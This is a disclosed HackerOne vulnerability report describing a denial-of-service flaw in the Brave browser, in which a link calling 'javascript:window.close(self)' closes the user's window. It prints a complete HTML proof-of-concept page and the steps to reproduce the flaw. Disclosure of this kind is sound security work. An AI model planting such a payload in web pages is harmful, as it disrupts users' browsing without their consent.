# Denial of service attack(window object) on brave browser

## Report Details
- **Report ID**: 176197
- **URL**: https://hackerone.com/reports/176197
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-16T21:31:08.926Z
- **Disclosed**: 2016-10-25T21:41:30.064Z

## Reporter
- **Username**: sahiltikoo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
hey there,

The Brave browser is vulnerable to window object based denial of
service attack. The brave browser fails to sanitize a check when window.close()
function is called in number of dynamically generated events.. The
function is called in a suppressed manner and kills the parent window
directly by default which makes it vulnerable to denial of service attack.

When an attacker sends an html file to victim :-

<html>
<title>Brave Window Object  Remote Denial of Service.</title>
<head></head>
 
<body><br><br>
<h1><center>Brave Window Object  Remote Denial of Service</center></h1><br><br>
<h2><center>Proof of Concept</center></br></br> </h2>
 
 
<center>
<b>Click the  below link to Trigger the Vulnerability..</b><br><br>
<hr></hr>
 
<hr></hr>
<b><center><a href="javascript:window.close(self);">Brave  Window Object  DoS Test POC</a></center>
 
</center>
</body>
 
 
</html>

Here window.close() method should be sanitized and should not close the current window.I tested it in Firefox and chrome(Linux platform) and this widow object is validated there and current window doesn't close.
 
This security issue is a result of design flaw in the browser.Scripts must not close windows that were not opened by script,if script specific code is designed.
There must be a parent window confirmation check prior to close of window.
 

## Products affected: 

Latest Brave browser in Linux(Kali Linux)

## Steps To Reproduce:

1 Open the HTML file in brave browser in your Linux platform
2 click on the link provided 
3 You will see the current window i.e. the window in which the HTML file was opened closes.

## Supporting Material/References:

I have added a video POC and the html file.


## Attachments
- Brave(window).html
- Brave_video.ogv
